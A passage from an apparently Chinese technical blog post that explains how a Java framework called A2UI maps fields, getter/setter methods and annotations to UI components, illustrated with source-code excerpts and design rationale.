<li>索引是整数，可以排序</li>
<li>索引的分配规则是固定的</li>
<li>索引的优先级是明确的</li>
</ul>
</li>
<li><strong>为什么需要支持自定义索引？</strong>
<ul>
<li>允许开发者调整字段顺序</li>
<li>支持字段的灵活排列</li>
<li>满足不同的UI需求</li>
</ul>
</li>
</ol>
<h3 data-id="heading-25">5. 映射规则层确定性</h3>
<p>映射规则是A2UI确定性的第五层保障，通过映射规则提供组件选择的确定性。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4594f0f83e9f46d1a75a9031a04a65c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=m5zl9EEW69yRKrAHfmXvOlmUtmc%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>映射规则确定性示例：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ComponentType -&gt; UIComponent</span>
<span class="hljs-variable constant_">INPUT</span> -&gt; <span class="hljs-title class_">InputUIComponent</span>
<span class="hljs-variable constant_">CHECKBOX</span> -&gt; <span class="hljs-title class_">CheckboxUIComponent</span>
<span class="hljs-variable constant_">COMBOINPUT</span> -&gt; <span class="hljs-title class_">ComboInputUIComponent</span>
<span class="hljs-variable constant_">RICHEDITOR</span> -&gt; <span class="hljs-title class_">RichEditorUIComponent</span>

<span class="hljs-comment">// ComboInputType -&gt; ComboBoxMeta</span>
number -&gt; <span class="hljs-title class_">NumberComboBoxMeta</span>
date -&gt; <span class="hljs-title class_">DateComboBoxMeta</span>
checkbox -&gt; <span class="hljs-title class_">CheckboxComboBoxMeta</span>
listbox -&gt; <span class="hljs-title class_">ListboxComboBoxMeta</span>

<span class="hljs-comment">// ColType -&gt; ComponentType</span>
<span class="hljs-variable constant_">BOOLEAN</span> -&gt; <span class="hljs-variable constant_">CHECKBOX</span>
<span class="hljs-variable constant_">TEXT</span> -&gt; <span class="hljs-variable constant_">MULTILINES</span>
<span class="hljs-variable constant_">DATETIME</span> -&gt; <span class="hljs-variable constant_">COMBOINPUT</span>

<span class="hljs-comment">// 确定性分析：</span>
<span class="hljs-comment">// 1. INPUT必然映射到InputUIComponent</span>
<span class="hljs-comment">// 2. CHECKBOX必然映射到CheckboxUIComponent</span>
<span class="hljs-comment">// 3. number必然映射到NumberComboBoxMeta</span>
<span class="hljs-comment">// 4. BOOLEAN必然映射到CHECKBOX</span>
</code></pre>
<h4 data-id="heading-26">设计思考：</h4>
<ol>
<li><strong>为什么映射规则能提供确定性？</strong>
<ul>
<li>映射规则是预定义的</li>
<li>映射关系是一对一的</li>
<li>映射规则不会在运行时改变</li>
</ul>
</li>
<li><strong>为什么需要多层次的映射？</strong>
<ul>
<li>支持不同的抽象层次</li>
<li>支持不同的使用场景</li>
<li>提供灵活的映射机制</li>
</ul>
</li>
</ol>
<h2 data-id="heading-27">组织类方法的原则规则</h2>
<p>A2UI组织类方法遵循六大原则，每个原则都有其特定的设计目的和实现方式。</p>
<h3 data-id="heading-28">原则1：字段优先原则</h3>
<p>字段优先原则是指在字段和方法都存在时，优先使用字段的定义。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fb551f5bb63480eb2443910c69c8354~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=YjjNnxFx3mHlQkPVauwJ1nWmY%2FQ%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-title class_">BridgeMethodConfig</span> methodInfo : methodInfos) {
    <span class="hljs-keyword">if</span> (methodInfo.<span class="hljs-title function_">isSerialize</span>()) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">MethodUtil</span>.<span class="hljs-title function_">isGetMethod</span>(methodInfo.<span class="hljs-title function_">getInnerMethod</span>()) || methodInfo.<span class="hljs-title function_">isModule</span>()) {
            <span class="hljs-title class_">String</span> fieldName = methodInfo.<span class="hljs-title function_">getFieldName</span>();
            <span class="hljs-title class_">CustomAnnotation</span> allmapping = customAnnotationMap.<span class="hljs-title function_">get</span>(fieldName);

            <span class="hljs-comment">// 字段必须可见</span>
            <span class="hljs-keyword">if</span> (!disableFieldMap.<span class="hljs-title function_">containsKey</span>(methodInfo.<span class="hljs-title function_">getFieldName</span>())) {
                <span class="hljs-comment">// 如果字段未定义或为默认字段，才使用方法</span>
                <span class="hljs-title class_">BridgeField</span> field = fieldMap.<span class="hljs-title function_">get</span>(fieldName.<span class="hljs-title function_">toLowerCase</span>());
                <span class="hljs-keyword">if</span> (field == <span class="hljs-literal">null</span>
                        || !(field <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">BridgeFieldConfig</span>)
                        || ((<span class="hljs-title class_">BridgeFieldConfig</span>) fieldMap.<span class="hljs-title function_">get</span>(fieldName.<span class="hljs-title function_">toLowerCase</span>())).<span class="hljs-title function_">isDefault</span>()) {
                    fieldMap.<span class="hljs-title function_">put</span>(fieldName.<span class="hljs-title function_">toLowerCase</span>(), methodInfo);
                    esdFieldMap.<span class="hljs-title function_">put</span>(methodInfo.<span class="hljs-title function_">getFieldName</span>(), methodInfo);
                    <span class="hljs-keyword">if</span> (!fieldNameList.<span class="hljs-title function_">contains</span>(methodInfo.<span class="hljs-title function_">getFieldName</span>())) {
                        fieldNameList.<span class="hljs-title function_">add</span>(methodInfo.<span class="hljs-title function_">getFieldName</span>());
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">if</span> (allmapping == <span class="hljs-literal">null</span> &amp;&amp; (methodInfo.<span class="hljs-title function_">isCustomFiled</span>() || methodInfo.<span class="hljs-title function_">isDynLoad</span>())) {
                        <span class="hljs-comment">// 优先使用字段注解</span>
                        fieldMap.<span class="hljs-title function_">put</span>(fieldName.<span class="hljs-title function_">toLowerCase</span>(), methodInfo);
                    }
                }
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-29">设计思考：</h4>
<ol>
<li><strong>为什么字段优先？</strong>
<ul>
<li>字段是数据的直接表示，更直观</li>
<li>字段的类型和注解更明确</li>
<li>减少方法解析的复杂性</li>
</ul>
</li>
<li><strong>什么时候使用方法？</strong>
<ul>
<li>字段未定义时</li>
<li>字段为默认字段时</li>
<li>方法有自定义注解时</li>
</ul>
</li>
</ol>
<h3 data-id="heading-30">原则2：Getter/Setter识别原则</h3>
<p>Getter/Setter识别原则是指通过方法名识别Getter和Setter方法。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bc0882c7478471a9446aa9658380782~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=MHndJ9OMtG6NbK%2Fyanx0jPaYQew%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldName</span> = <span class="hljs-title class_">MethodUtil</span>.<span class="hljs-title function_">getFieldName</span>(method);

<span class="hljs-comment">// MethodUtil.getFieldName() 实现逻辑</span>
public <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getFieldName</span>(<span class="hljs-params">Method method</span>) {
    <span class="hljs-title class_">String</span> methodName = method.<span class="hljs-title function_">getName</span>();
    <span class="hljs-keyword">if</span> (methodName.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"get"</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">OODUtil</span>.<span class="hljs-title function_">formatJavaName</span>(methodName.<span class="hljs-title function_">substring</span>(<span class="hljs-number">3</span>), <span class="hljs-literal">false</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"set"</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">OODUtil</span>.<span class="hljs-title function_">formatJavaName</span>(methodName.<span class="hljs-title function_">substring</span>(<span class="hljs-number">3</span>), <span class="hljs-literal">false</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"is"</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">OODUtil</span>.<span class="hljs-title function_">formatJavaName</span>(methodName.<span class="hljs-title function_">substring</span>(<span class="hljs-number">2</span>), <span class="hljs-literal">false</span>);
    }
    <span class="hljs-keyword">return</span> methodName;
}
</code></pre>
<h4 data-id="heading-31">设计思考：</h4>
<ol>
<li><strong>为什么识别Getter/Setter？</strong>
<ul>
<li>符合Java Bean规范</li>
<li>提供对私有字段的访问</li>
<li>支持动态计算字段</li>
</ul>
</li>
<li><strong>为什么需要三种模式？</strong>
<ul>
<li>getXxx：标准Getter</li>
<li>setXxx：标准Setter</li>
<li>isXxx：Boolean Getter</li>
</ul>
</li>
</ol>
<h3 data-id="heading-32">原则3：注解优先级原则</h3>
<p>注解优先级原则是指不同注解之间有明确的优先级顺序。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5495561b33dc40088bf7206a9cba0eb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=hngpTzNUiSyJ6WM0vDtM%2Bk3tmgs%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">Integer index, BridgeClass bridgeClass</span>) {
    <span class="hljs-comment">// ...</span>

    <span class="hljs-comment">// CustomAnnotation - 最高优先级</span>
    <span class="hljs-keyword">if</span> (customAnnotation != <span class="hljs-literal">null</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">customBean</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomFieldMeta</span>(customAnnotation);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span> = customBean.<span class="hljs-title function_">getIndex</span>();
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">target</span> = customBean.<span class="hljs-title function_">getTarget</span>();
        <span class="hljs-keyword">if</span> (customAnnotation.<span class="hljs-title function_">hidden</span>()) {
            componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">HIDDENINPUT</span>;
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">hidden</span> = <span class="hljs-literal">true</span>;
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isCaption</span> = customAnnotation.<span class="hljs-title function_">captionField</span>();
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">uid</span> = customAnnotation.<span class="hljs-title function_">uid</span>();
        <span class="hljs-comment">// ...</span>
    }

    <span class="hljs-comment">// JSONField - 覆盖基本属性</span>
    <span class="hljs-keyword">if</span> (jsonField != <span class="hljs-literal">null</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">serialize</span> = jsonField.<span class="hljs-title function_">serialize</span>();
        <span class="hljs-keyword">if</span> (!jsonField.<span class="hljs-title function_">name</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-string">""</span>)) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldName</span> = jsonField.<span class="hljs-title function_">name</span>();
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = jsonField.<span class="hljs-title function_">name</span>();
        }
        <span class="hljs-keyword">if</span> (!jsonField.<span class="hljs-title function_">name</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-string">""</span>)) {
            id = jsonField.<span class="hljs-title function_">name</span>();
        }
    }

    <span class="hljs-comment">// 中文注解 - 最后覆盖</span>
    <span class="hljs-keyword">if</span> (caption == <span class="hljs-literal">null</span> || caption.<span class="hljs-title function_">equals</span>(<span class="hljs-string">""</span>)) {
        <span class="hljs-keyword">if</span> (methodChinaName != <span class="hljs-literal">null</span>) {
            caption = methodChinaName.<span class="hljs-title function_">cname</span>();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (caption.<span class="hljs-title function_">equals</span>(<span class="hljs-string">""</span>)) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">caption</span> = name;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-33">设计思考：</h4>
<ol>
<li><strong>为什么需要优先级？</strong>
<ul>
<li>支持灵活的配置</li>
<li>允许覆盖默认行为</li>
<li>保持向后兼容性</li>
</ul>
</li>
<li><strong>为什么CustomAnnotation优先级最高？</strong>
<ul>
<li>CustomAnnotation是业务注解</li>
<li>业务需求优先于框架需求</li>
<li>支持自定义业务逻辑</li>
</ul>
</li>
</ol>
<h3 data-id="heading-34">原则4：索引排序原则</h3>
<p>索引排序原则是指按照索引值对字段进行排序。</p>
<p>Index Sorting</p>
<p>Get All Fields</p>
<p>Sort by Index</p>
<p>Render in Order</p>
<p>Field1: index=0</p>
<p>Field2: index=1</p>
<p>Field3: index=2</p>
<p>Field4: index=10</p>
<p>Field1, Field2, Field3, Field4</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">int index = <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : allCtFields) {
    fieldTasks.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitFieldTask</span>&lt;&gt;(field, index, <span class="hljs-variable language_">this</span>));
    index++;
}

<span class="hljs-comment">// BridgeBaseField.java</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span> = index;

@<span class="hljs-title class_">Override</span>
public int <span class="hljs-title function_">compareTo</span>(<span class="hljs-params">BridgeField o</span>) {
    <span class="hljs-keyword">if</span> (index == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    }

    <span class="hljs-keyword">if</span> (index != <span class="hljs-literal">null</span> &amp;&amp; o.<span class="hljs-title function_">getIndex</span>() != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span> - o.<span class="hljs-title function_">getIndex</span>();
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-35">设计思考：</h4>
<ol>
<li><strong>为什么需要索引排序？</strong>
<ul>
<li>保证字段顺序的确定性</li>
<li>支持自定义排序</li>
<li>便于UI渲染</li>
</ul>
</li>
<li><strong>为什么使用compareTo？</strong>
<ul>
<li>支持Collections.sort()</li>
<li>提供灵活的排序机制</li>
<li>符合Java规范</li>
</ul>
</li>
</ol>
<h3 data-id="heading-36">原则5：类型推断原则</h3>
<p>类型推断原则是指根据Java类型推断UI组件类型。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1863ca9a3d44df6ab8775a50cd2e673~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=ZEXXjwpffg16Pgu6BoWTLXC1OWQ%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">static</span> <span class="hljs-title class_">ComponentType</span> <span class="hljs-title function_">getComponentType</span>(<span class="hljs-params">Class typeClass, Type type</span>) {
    <span class="hljs-title class_">Class</span> clazz = <span class="hljs-title class_">JSON</span>GenUtil.<span class="hljs-title function_">getInnerType</span>(type);

    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Enumstype</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(clazz) || clazz.<span class="hljs-title function_">isEnum</span>()) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (typeClass != <span class="hljs-literal">null</span> &amp;&amp; (typeClass.<span class="hljs-title function_">isArray</span>() || <span class="hljs-title class_">Collection</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(typeClass))) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(customClass).<span class="hljs-title function_">contains</span>(clazz) || typeClass.<span class="hljs-title function_">equals</span>(clazz)) {
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">LIST</span>;
        }
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(boolean.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Boolean</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">CHECKBOX</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(int.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Integer</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Reader</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">RICHEDITOR</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">StringBuffer</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">RICHEDITOR</span>;
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>;
}
</code></pre>
<h4 data-id="heading-37">设计思考：</h4>
<ol>
<li><strong>为什么需要类型推断？</strong>
<ul>
<li>减少注解的使用</li>
<li>提供合理的默认值</li>
<li>提高开发效率</li>
</ul>
</li>
<li><strong>为什么需要检查多种类型？</strong>
<ul>
<li>支持不同的Java类型</li>
<li>支持泛型类型</li>
<li>支持自定义类型</li>
</ul>
</li>
</ol>
<h3 data-id="heading-38">原则6：组件映射原则</h3>
<p>组件映射原则是指将组件类型映射到具体的UI组件类。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8c3883281184a8bb21c5990c82effe8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=8reYmzBQCuWdC5vdk4JGTJooJvU%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-title class_">Class</span>&lt;<span class="hljs-title class_">UIComponent</span>&gt; <span class="hljs-title function_">getComponent</span>(<span class="hljs-params">ComponentType componentType</span>) {
    <span class="hljs-title class_">Class</span>&lt;<span class="hljs-title class_">UIComponent</span>&gt; componentClass = widgetComponentMap.<span class="hljs-title function_">get</span>(componentType);
    <span class="hljs-keyword">return</span> componentClass;
}

<span class="hljs-keyword">void</span> <span class="hljs-title function_">initClass</span>(<span class="hljs-params">Class beanClazz</span>) {
    <span class="hljs-title class_">CustomClass</span> customClass = (<span class="hljs-title class_">CustomClass</span>) beanClazz.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">CustomClass</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">CustomBean</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(beanClazz) &amp;&amp; customClass != <span class="hljs-literal">null</span>) {
        <span class="hljs-title class_">AnnotationType</span> ann = (<span class="hljs-title class_">AnnotationType</span>) beanClazz.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">AnnotationType</span>.<span class="hljs-property">class</span>);
        viewTypeAnnMap.<span class="hljs-title function_">put</span>(ann.<span class="hljs-title function_">clazz</span>(), customClass);
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">UIComponent</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(customClass.<span class="hljs-title function_">clazz</span>())) {
            <span class="hljs-keyword">switch</span> (customClass.<span class="hljs-title function_">viewType</span>()) {
                <span class="hljs-keyword">case</span> <span class="hljs-attr">COMPONENT</span>:
                    <span class="hljs-title class_">WidgetMetaMap</span>.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), beanClazz);
                    widgetComponentMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), customClass.<span class="hljs-title function_">clazz</span>());
                    <span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) {
                        widgetClass.<span class="hljs-title function_">add</span>(ann.<span class="hljs-title function_">clazz</span>());
                        widgetAnnMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), ann.<span class="hljs-title function_">clazz</span>());
                    }
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-attr">COMBOBOX</span>:
                    <span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) {
                        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">ComboInputType</span> inputType : customClass.<span class="hljs-title function_">inputType</span>()) {
                            comboBoxAnnMap.<span class="hljs-title function_">put</span>(inputType, ann.<span class="hljs-title function_">clazz</span>());
                            comboBoxComponentMap.<span class="hljs-title function_">put</span>(inputType, customClass.<span class="hljs-title function_">clazz</span>());
                        }
                        widgetClass.<span class="hljs-title function_">add</span>(ann.<span class="hljs-title function_">clazz</span>());
                        widgetAnnMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), ann.<span class="hljs-title function_">clazz</span>());
                    }

                    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">ComboInputType</span> inputType : customClass.<span class="hljs-title function_">inputType</span>()) {
                        comboBoxBeanMap.<span class="hljs-title function_">put</span>(inputType, beanClazz);
                    }
                    <span class="hljs-keyword">break</span>;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-39">设计思考：</h4>
<ol>
<li><strong>为什么需要组件映射？</strong>
<ul>
<li>支持组件扩展</li>
<li>提供组件查找机制</li>
<li>实现组件工厂模式</li>
</ul>
</li>
<li><strong>为什么需要区分COMPONENT和COMBOBOX？</strong>
<ul>
<li>COMPONENT：独立组件</li>
<li>COMBOBOX：下拉组件</li>
<li>不同的组件类型有不同的渲染逻辑</li>
</ul>
</li>
</ol>
<h2 data-id="heading-40">构建编译与列结构抽象建模</h2>
<h3 data-id="heading-41">1. 构建阶段</h3>
<p>构建阶段是指将Java类加载到内存中，并创建BridgeClass实例。</p>
<p>C2UConfigFactoryReflectionBridgeClassBridgeClassLoaderUserC2UConfigFactoryReflectionBridgeClassBridgeClassLoaderUser加载类获取类信息返回类信息创建BridgeClass获取字段和方法返回字段和方法初始化字段返回字段配置初始化方法返回方法配置返回BridgeClass实例</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">Class ctClass</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctClass</span> = ctClass;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">allCtFields</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">// 获取所有字段</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : ctClass.<span class="hljs-title function_">getDeclaredFields</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(field.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(field.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"this$"</span>)) {
            allCtFields.<span class="hljs-title function_">add</span>(field);
        }
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : ctClass.<span class="hljs-title function_">getFields</span>()) {
        <span class="hljs-keyword">if</span> (field.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(ctClass)
                &amp;&amp; !field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"this$"</span>)
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(field.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !field.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>)) {
            allCtFields.<span class="hljs-title function_">add</span>(field);
        }
    }

    <span class="hljs-comment">// 获取所有方法</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">allCtMethods</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; methodNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Method</span> method : ctClass.<span class="hljs-title function_">getDeclaredMethods</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(method.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getDeclaringClass</span>())) {
            allCtMethods.<span class="hljs-title function_">add</span>(method);
            methodNames.<span class="hljs-title function_">add</span>(method.<span class="hljs-title function_">getName</span>());
        }
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Method</span> method : ctClass.<span class="hljs-title function_">getMethods</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(method.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !methodNames.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getName</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(ctClass)
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Enum</span>.<span class="hljs-property">class</span>)
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>)) {
            allCtMethods.<span class="hljs-title function_">add</span>(method);
        }
    }

    <span class="hljs-comment">// 解析类级别注解</span>
    <span class="hljs-title class_">MethodChinaName</span> chinaName = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">MethodChinaName</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (chinaName != <span class="hljs-literal">null</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">methodChinaBean</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodChinaMeta</span>(chinaName);
    }

    <span class="hljs-title class_">RepositoryAnnotation</span> repository = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">RepositoryAnnotation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (repository != <span class="hljs-literal">null</span>) {
        repositoryBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RepositoryMeta</span>(repository);
    }

    <span class="hljs-title class_">Aggregation</span> aggregationClass = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">Aggregation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (aggregationClass != <span class="hljs-literal">null</span>) {
